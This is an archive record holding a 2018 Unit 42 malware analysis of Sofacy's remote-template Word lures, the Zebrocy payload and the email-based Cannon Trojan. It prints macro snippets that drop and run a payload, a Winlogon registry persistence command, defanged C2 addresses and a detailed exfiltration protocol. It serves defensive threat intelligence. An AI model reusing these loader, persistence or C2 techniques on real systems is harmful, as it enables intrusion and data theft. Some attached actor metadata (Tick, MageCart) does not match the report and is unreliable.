{
    "id": "2329320c-f597-432b-ad1f-ec3bcaec2e83",
    "created_at": "2023-01-12T15:00:46.311276Z",
    "updated_at": "2025-03-27T02:17:11.878365Z",
    "deleted_at": null,
    "sha1_hash": "1ac7127bebd803d75f28fa37db17f88fcc7d2a84",
    "title": "2018-11-20 - Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan",
    "authors": "",
    "file_creation_date": "2022-05-28T00:35:08Z",
    "file_modification_date": "2022-05-28T00:35:08Z",
    "file_size": 402729,
    "plain_text": "# Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan\n\n**[unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/](https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/)**\n\nRobert Falcone, Bryan Lee November 20, 2018\n\nBy [Robert Falcone and](https://unit42.paloaltonetworks.com/author/robertfalcone/) [Bryan Lee](https://unit42.paloaltonetworks.com/author/bryanlee/)\n\nNovember 20, 2018 at 6:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [Cannon,](https://unit42.paloaltonetworks.com/tag/cannon/) [Sofacy,](https://unit42.paloaltonetworks.com/tag/sofacy/) [Zebrocy](https://unit42.paloaltonetworks.com/tag/zebrocy/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/)\n\nIn late October and early November 2018, Unit 42 intercepted a series of weaponized documents\nthat use a technique to load remote templates containing a malicious macro. These types of\nweaponized documents are not uncommon but are more difficult to identify as malicious by\nautomated analysis systems due to their modular nature. Specific to this technique, if the C2 server\nis not available at the time of execution, the malicious code cannot be retrieved, rendering the\ndelivery document largely benign.\n\nThe weaponized documents targeted several government entities around the globe, including North\nAmerica, Europe, and a former USSR state. Fortunately for us, the C2 servers for several of these\ndocuments were still operational allowing for retrieval of the malicious macro and the subsequent\n[payloads. Analysis revealed a consistent first-stage payload of the well-documented Zebrocy](https://blog.paloaltonetworks.com/tag/Zebrocy/)\nTrojan. Additional collection of related documents revealed a second first-stage payload that we\nhave named ‘Cannon’. Cannon has not been previously observed in use by the Sofacy group and\ncontains a novel email-based C2 communication channel. Email as a C2 channel is not a new\n\n\n-----\n\ntactic, but it is generally not observed in the wild as often as HTTP or HTTPS. Using email as a C2\nchannel may also decrease the chance of detection, as sending email via non-sanctioned email\nproviders may not necessarily construe suspicious or even malicious activity in many enterprises.\n\nThe activity discussed in this blog revolves around two of the multitude of weaponized documents\nthat we collected. These two documents shared multiple data artifacts, such as a shared C2 IP,\nshared author name, and shared tactics. Details of the extended attack campaign associated with\nthe Cannon Trojan will be discussed in a later blog. A particularly interesting aspect of one of the\ntwo documents we analyzed was the filename used, crash list(Lion Air Boeing 737).docx. This is\nnot the first instance of an adversary group using recent current events as a lure, but it is interesting\nto see this group attempt to capitalize on the attention of a catastrophic event to execute their\nattack.\n\nAttack Details\n\nThe initial sample we intercepted was a Microsoft Word document (SHA256:\n2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f) with the filename\ncrash list(Lion Air Boeing 737).docx using the author name Joohn. This document appeared to be\ntargeting a government organization dealing with foreign affairs in Europe via spear-phishing. Once\nthe user attempts to open the document, Microsoft Word immediately attempts to load the remote\ntemplate containing a malicious macro and payload from the location specified within the\nsettings.xml.rels file of the DOCX document, as seen here:\n\n1 <Relationship Id=\"rId1\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"\nTarget=\"hxxp://188.241.58[.]170/live/owa/office.dotm\" TargetMode=\"External\"/>\n\nIf the C2 has already been taken offline the document will still open, but Word will be unable to\nretrieve the remote template and thus Word will not load a macro. In this situation, Word will\npresent the same lure document to the victim as seen in Figure 2, but without the ability to enable\nmacros via an Enable Content button. Assuming the C2 is still operational however, Word loads the\nremote template (SHA256:\nf1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5) and the user is\npresented with the screen as seen in Figure 1.\n\n\n-----\n\n_Figure 1 Lure screen_\n\nOnce the victim presses the Enable content button, the embedded macro is executed. The macros\nused for these delivery documents use a less common method of using the AutoClose function.\nThis is a form of anti-analysis as Word will not fully execute the malicious code until the user closes\nthe document. If an automated sandbox exits its analysis session without specifically closing out\nthe document, the sandbox may miss the malicious activity entirely. Once successfully executed,\nthe macro will install a payload and save a document to the system. Typically, we expect to see a\ndecoy document saved to the system and later displayed to make the victim less suspicious of\nmalicious activity; however, in this case the document saved to the system was never displayed\nand does not contain any pertinent content to the Lion Air tragedy theme seen in the filename. The\nmacro obtains the document saved to the system from within the document stored as\nUserForm1.Label1.Caption and will write it to:\n\n%TEMP%\\~temp.docm\n\nThe macro obtains the payload saved to the system from within the document stored as\nUserForm1.Label2.Caption and will write it to:\n\n%APPDATA%\\MSDN\\~msdn.exe\n\nThe macro executes this payload in a rather interesting way by loading the dropped ~temp.docm\ndocument and calling a function within its embedded macro to run the payload. We believe the\ncreator of this delivery document chose to run the payload from the dropped file as an evasion\ntechnique. Also, the fact the initial macro uses this dropped document for the execution of the\npayload may also explain why the document did not contain any decoy contents.\n\n\n-----\n\nTo carry out this functionality, after writing the ~temp.docm and ~msdn.exe files to the system, the\ninitial macro will load the ~temp.docm file as a Word Document object and attempts to run the\nfunction Proc1 in the Module1 macro within the ~temp.docm file, as seen in the following code\nsnippet:\n\n\n1\n2\n3\n4\n\n\nSet WA = CreateObject(\"Word.Application\")\nWA.Visible = False\nSet oMyDoc = WA.Documents.Open(vF)\nWA.Application.Run \"Module1.Proc1\"\n\n\nThe Proc1 function within the Module1 does nothing more than build the\n%APPDATA%\\MSDN\\~msdn.exe path to the dropped payload and executes it using the built-in\nShell function, as seen in the following code snippet:\n\n\n1\n2\n3\n4\n\n\nvAdd = \"~msdn\"\nvFileName = Environ(\"APPDATA\") & \"\\MSDN\\\"\nvFileName = vFileName + vAdd & \".e\" + \"x\" & \"e\"\nShell vFileName\n\n\nThe payload dropped to the system (SHA256:\n6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a) is a UPX packed\nZebrocy variant written in the Delphi language. This variant of Zebrocy is functionally very similar to\nthe Delphi-based payloads discussed in our previous publication on Sofacy attacks using Zebrocy\nearlier this year. The developer of this particular payload configured it to use the following URL to\ncommunicate with as its C2:\n\nhxxp://188.241.58[.]170/local/s3/filters.php\n\nThe Zebrocy Trojan gathers system specific information that it will send to the C2 server via an\nHTTP POST request to the above URL. Like other Zebrocy samples, this Trojan collects system\nspecific information it will send to the C2 server by running the command SYSTEMINFO &\nTASKLIST on the command line and by enumerating information about connected storage devices.\nThis specific variant of Zebrocy will also send a screenshot of the victim host as a JPEG image to\nthe C2 server. The C2 server will then provide a secondary payload to the beacon in ASCII\nhexadecimal representation, which the Trojan will decode and write to the following location:\n\n%APPDATA%\\Roaming\\Audio\\soundfix.exe\n\nDuring our analysis, the C2 server provided a secondary payload that functionally appeared similar\nto the initial Zebrocy sample. The secondary payload was also written in Delphi and its developer\nconfigured it to communicate with its C2 server using HTTPS via the following URL:\n\nhxxps://200.122.181[.]25/catalog/products/books.php\n\nNew Cannon Trojan\n\n\n-----\n\nWe were able to collect a second delivery document that shared the Joohn author from the crash\nlist(Lion Air Boeing 737).docx document, as well as the 188.241.58[.]170 C2 IP to host its remote\ntemplate. Structurally this sample was very similar to the initially analyzed document, but the\npayload turned out to be a completely new tool which we have named Cannon.\n\nThe tool is written in C# whose malicious code exists in a namespace called cannon, which is the\nbasis of the Trojan’s name. The Trojan functions primarily as a downloader that relies on emails to\ncommunicate between the Trojan and the C2 server. To communicate with the C2 server, the\nTrojan will send emails to specific email addresses via SMTPS over TCP port 587. The specific\nfunctions of Cannon can be seen in Table 1. This tool also has a heavy reliance on EventHandlers\nwith timers to run its methods in a specific order and potentially increase its evasion capability.\n\n**Function** **Description** **Timer**\n**(seconds)**\n\nstart_Tick Adds persistence and generates unique system specific identifier 1\n\ninf_Tick Gathers system information 300\n\nscreen_Tick Takes a screenshot of the desktop 10\n\n\ntxt_Tick Logs into primary POP3 account and gets secondary POP3\naccount\n\nload_Tick Logs into secondary POP3 account to download attachment to\nemail\n\nsubject_Tick Logs into primary POP3 account to get path to for the downloaded\nattachment\n\nrun_Tick Moves the downloaded attachment to path and creates a process\nwith attachment\n\n_Table 1 Functions executed by Cannon and their purpose_\n\n\n120\n\n120\n\n120\n\n60\n\n\nThe overall purpose of Cannon is to use several email accounts to send system data (system\ninformation and screenshot) to the threat actors and to ultimately obtain a payload from an email\nfrom the actors. The image in Figure 2, in addition to the following step-by-step process illustrates\nhow Cannon communicates with the actor-controlled C2 email address to obtain a secondary\npayload:\n\n\n-----\n\n_Figure 2 C2 process flow for Cannon_\n\n1. Cannon gathers system information and saves it to a file named ini. The Trojan sends an\n\nemail to sahro.bella7[at]post.cz with i.ini as the attachment, S_inf within the body and a\nsubject with a unique system identifier via SMTPS from one of the following accounts:\n\nBishtr.cam47\nLobrek.chizh\nCervot.woprov\n\n\n-----\n\n1. Cannon takes a screenshot and saves it to a file named ops. The Trojan sends an email to\n\nsahro.bella7[at]post.cz with sysscr.ops as the attachment, the string SCreen within the body\nand a subject with the unique system identifier via SMTPS from one of three previously used\naccounts.\n2. The actors likely log into sahro.bella7[at]post.cz and process the system information and\n\nscreenshot sent by the Trojan to determine if the compromised host is of interest. If the actor\nwishes to download an additional payload to the compromised host, they will respond by\nsending emails in the following steps.\n3. The actor sends an email to trala.cosh2[at]post.cz with the unique system identifier as a\n\nsubject with a secondary email account and credentials in ASCII hexadecimal format within\nthe message body. This secondary email account is unknown at this time, so we will refer to it\nas \"secondary email account\" in future steps.\n4. The actor sends an email to the secondary email account with the unique system identifier as\n\na subject with a secondary payload attached with a filename of txt.\n5. Cannon logs into the trala.cosh2[at]post.cz account via POP3S looking for emails with a\n\nsubject that matches the unique system identifier. Cannon opens the email with the correct\nsubject and decodes the hexadecimal data in the body of the message to obtain the\nsecondary email account.\n6. Cannon acknowledges the receipt of the secondary email address by sending an email\n\nto sahro.bella7[at]post.cz with s.txt (contains {SysPar = 65} string) as the attachment, ok\nwithin the body and a subject with the unique system identifier via SMTPS from one of the\nthree accounts from Step 1.\n7. The actor sends an email to trala.cosh2[at]post.cz with the unique system identifier as a\n\nsubject with a file path that the Cannon Trojan will use to save the secondary payload.\n8. Cannon logs into the secondary email account via POP3S looking for emails with a subject\n\nthat matches the unique system identifier. Cannon opens the email with the correct subject\nand saves the attachment named auddevc.txt.\n9. Cannon acknowledges the receipt of file download by sending an email\n\nto sahro.bella7[at]post.cz with l.txt (contains 090 string) as the attachment, ok2 within the\nbody and a subject with the unique system identifier via SMTPS from one of the three\naccounts from Step 1.\n10. Cannon logs into the trala.cosh2[at]post.cz account via POP3S looking for emails with a\n\nsubject that matches the unique system identifier. Cannon opens the email with the correct\nsubject and decodes the hexadecimal data in the body of the message to obtain the file path\nthat it will use to move the downloaded auddevc.txt file.\n11. Cannon acknowledges the receipt of file path by sending an email to sahro.bella7[at]post.cz\n\nwith s.txt (contains {SysPar = 65} string) as the attachment, ok3 within the body and a subject\nwith the unique system identifier via SMTPS from one of the three accounts from Step 1.\n12. Cannon moves the downloaded file to the specified path.\n13. Cannon acknowledges the successful move by sending an email to sahro.bella7[at]post.cz\n\nwith l.txt (contains 090 string) as the attachment, ok4 within the body and a subject with the\nunique system identifier via SMTPS from one of the three accounts from Step 1.\n14. Cannon runs the downloaded file from the specified path.\n\n\n-----\n\n15. Cannon acknowledges the successful execution by sending an email\n\nto sahro.bella7[at]post.cz with s.txt (contains {SysPar = 65} string) as the attachment, ok5\nwithin the body and a subject with the unique system identifier via SMTPS from one of the\nthree accounts from Step 1.\n\nFor a complete analysis of Cannon, please refer to the Appendix.\n\nConclusion\n\nThe Sofacy threat group continues to target government organizations in the EU, US, and former\nSoviet states to deliver the Zebrocy tool as a payload. In these attacks, the delivery documents\nused to install Zebrocy used remote templates, which increases the difficulty to analyze the attack\nas an active C2 server is needed to obtain the macro-enabled document. The Sofacy group also\nleveraged the recent Lion Air disaster as a lure in one of these attacks, which continues to show a\nwillingness to use current events in their social engineering themes.\n\nOf note, we also discovered the Sofacy group using a very similar delivery document to deliver a\nnew Trojan called Cannon. Cannon uses SMTPS and POP3S as its C2 channel compared to\nZebrocy that uses a more commonly observed HTTP or HTTPS based C2. This is not a new tactic\nbut may be more effective at evading detection as the external hosts involved are a legitimate email\nservice provider. Add the layer of encryption that the SMTPS and POP3S protocols provide to the\nlegitimate web-based service and you have a very difficult C2 channel to block\n\nWhile Sofacy’s campaign delivering Zebrocy and Cannon remains active, Palo Alto Networks\ncustomers are protected from this threat in the following ways:\n\n[AutoFocuscustomers can track these samples with the Zebrocy and](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Zebrocy) [Cannon](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Cannon)\nWildFiredetects the delivery documents, Zebrocy and Cannon payloads discussed in this blog\nwith malicious verdicts.\nTraps blocks the macro-ladened remote templates as Suspicious macro detected, as well as\nZebrocy and Cannon payloads as Suspicious executable detected.\nThe IP addresses hosting remote templates and C2 services in these attacks are classified as\nCommand and Control.\n\nIndicators of Compromise\n\n**Delivery Hashes**\n\n2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f\naf77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392\n\n**Remote Template Hashes**\n\nf1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5\nfc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557d\n\n**Remote Templates**\n\n\n-----\n\nhxxp://188.241.58[.]170/live/owa/office.dotm\n\n**Zebrocy Hashes**\n\n6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a\n\n**Zebrocy C2 URLs**\n\nhxxp://188.241.58[.]170/local/s3/filters.php\n\nhxxps://200.122.181[.]25/catalog/products/books.php\n\n**Cannon Hashes**\n\n61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e\n\n**Cannon Email Accounts**\nsahro.bella7[at]post.cz\ntrala.cosh2[at]post.cz\nbishtr.cam47[at]post.cz\nlobrek.chizh[at]post.cz\ncervot.woprov[at]post.cz\n\n## Appendix\n\nThe Cannon Trojan is written in C# and functions primarily as a downloader that relies on emails to\ncommunicate between the Trojan and the C2 server. To communicate with the C2 server, the\nTrojan will send emails to specific email addresses via SMTPS over TCP port 587. This tool uses a\nvariety of functions that are run in a specific order to:\n\nGather system information and a screenshot\nSend the gathered information to the actor via an email\nCheck inbox for email from actor with payload attached\nDownload payload attached to email\nExecute downloaded payload\n\nThe functions called to carry out these activities are as follows:\n\n**start_Tick**\n\nThis function starts off by writing the string {SysPar = 65} to a file named s.txt, which will be used\nduring C2 communications throughout the execution of this Trojan. This function is also responsible\nfor creating persistence by writing the following to r.bat and executing it:\n\n\n-----\n\nREG ADD HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Shell /t REG_SZ\n/d [path to wsslc.exe]\n\nIt also creates a unique system specific identifier that it will use during the C2 communications to\nsend and receive messages. The system specific identifier is a 16 character string that the Trojan\ncreates using the serial number of the C volume and the first 4 hexadecimal bytes from\nEnvironment.UserName. The start_Tick function then begins the timer to run the inf_Tick method.\n\n**inf_Tick**\n\nResponsible for gathering system information, which it then saves to the i.ini file:\n\nApplication.ExecutablePath\nEnvironment.OSVersion\nEnvironment.SystemDirectory\nEnvironment.UserDomainName\nEnvironment.MachineName\nEnvironment.UserName\nTimeZone.CurrentTimeZone.StandardName\nEnvironment.TickCount\nDriveInfo.GetDrives() Name,VolumeLabel,DriveFormat,DriveType,TotalSize,AvailableFreeSpace,Serial number\nFolders in C:\\Program Files\\\nFolders in C:\\Program Files (x86)\\\nProcess.GetProcesses\n\nIt will use the aforementioned authentication credentials to log into the SMTP server to send the i.ini\nfile to the C2 email address. The email sent to exfiltrate this information will have i.ini attached to it\nwith the unique system identifier as the subject and S_inf within the body of the email message.\nThe inf_Tick function then begins the timer to run the screen_Tick method.\n\n**screen_Tick**\n\nTakes a screenshot of the desktop and saves it to a file named sysscr.ops. It will use the\naforementioned authentication credentials to log into the SMTP server to send the sysscr.ops file to\nthe C2 email address. The email sent to exfiltrate this information will have sysscr.ops file attached\nto it with the unique system identifier as the subject and SCreen within the body of the email\nmessage. The screen_Tick function then begins the timer to run the txt_Tick method.\n\n**txt_Tick**\n\nThe Trojan will attempt to log into pop.seznam[.]cz over POP3s using the account name\ntrala.cosh2[at]post.cz. If successful, the Trojan will access the messages in the inbox, specifically\nlooking for any emails that have a subject that matches the unique system identifier. If an email\nexists, the Trojan will treat the email's body as hexadecimal format and save it to a variable that will\nbe used by the load_Tick function. The Trojan will delete the email after reading and processing\nthese emails.\n\n\n-----\n\nIf the Trojan obtained the text from the email, it will use the aforementioned authentication\ncredentials to log into the SMTP server to send the s.txt file to the C2 email address. The email\nsent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as\nthe subject and the string ok within the body of the email message. The txt_Tick function then\nbegins the timer to run the load_Tick method.\n\n**load_Tick**\n\nThe Trojan will first remove all occurrences of B& and Db from the text obtained from the email in\nthe txt_Tick function. The Trojan will then split the remaining text on the % character and treat the\ncontent to the left of the % character as an account name and the content to the right as a\npassword. The Trojan uses these credentials to log into another email account at pop.seznam[.]cz\nvia POP3s, which it will check for email messages that have the unique system identifier as the\nsubject. The Trojan will parse emails with the correct subject to obtain its attachments. The Trojan\nwill save any attachments whose names contain the string auddevc to the system, which is meant\nto download a file named auddevc.txt. The Trojan will also create a file named l.txt that it will write\nthe string 090 to.\n\nIf the Trojan obtained the file from the email, it will use the aforementioned authentication\ncredentials to log into the SMTP server to send the l.txt file to the C2 email address. The email sent\nto exfiltrate this information will have l.txt file attached to it with the unique system identifier as the\nsubject and ok2 within the body of the email message. The load_Tick function then begins the timer\nto run the subject_Tick method.\n\n**subject_Tick**\n\nThis function is very similar in functionality to the txt_Tick function. Just like the txt_Tick function,\nthe Trojan will attempt to log into pop.seznam[.]cz over POP3s using the account name\ntrala.cosh2@post[.]cz, again looking for subject of emails in the inbox that match the unique system\nidentifier. The Trojan will then treat the body of the email as hexadecimal data that it will save to a\nvariable that will be used by the run_Tick function. The contents saved to the variable should be the\npath in which the actor wishes the file saved in the load_Tick function to be moved to and run from.\n\nIf the Trojan obtained the text from the email, it will use the aforementioned authentication\ncredentials to log into the SMTP server to send the s.txt file to the C2 email address. The email\nsent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as\nthe subject and ok3 within the body of the email message. The subject_Tick function then begins\nthe timer to run the run_Tick method.\n\n**run_Tick**\n\nThe Trojan will first attempt to create the directory within the path obtained from the email in the\nsubject_Tick function. It then attempts to move the auddevc.txt file downloaded in the\nload_Tick function to the newly created directory. If the file was successfully moved, the Trojan it\nwill use the aforementioned authentication credentials to log into the SMTP server to send the l.txt\nfile to the C2 email address. The email sent to exfiltrate this information will have l.txt file attached\nto it with the unique system identifier as the subject and ok4 within the body of the email message.\n\n\n-----\n\nThe Trojan then attempts to create a process using the newly moved downloaded file. If the Trojan\nwas able to successfully run the download file, it will use the aforementioned authentication\ncredentials to log into the SMTP server to send the s.txt file to the C2 email address. The email\nsent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as\nthe subject and ok5 within the body of the email message. The Trojan would then delete the\nsysscr.ops screenshot file and the i.ini system information file before exiting.\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-11-20 - Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan.pdf"
    ],
    "report_names": [
        "2018-11-20 - Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535646,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653698108,
    "ts_modification_date": 1653698108,
    "files": {
        "pdf": "https://archive.orkl.eu/1ac7127bebd803d75f28fa37db17f88fcc7d2a84.pdf",
        "text": "https://archive.orkl.eu/1ac7127bebd803d75f28fa37db17f88fcc7d2a84.txt",
        "img": "https://archive.orkl.eu/1ac7127bebd803d75f28fa37db17f88fcc7d2a84.jpg"
    }
}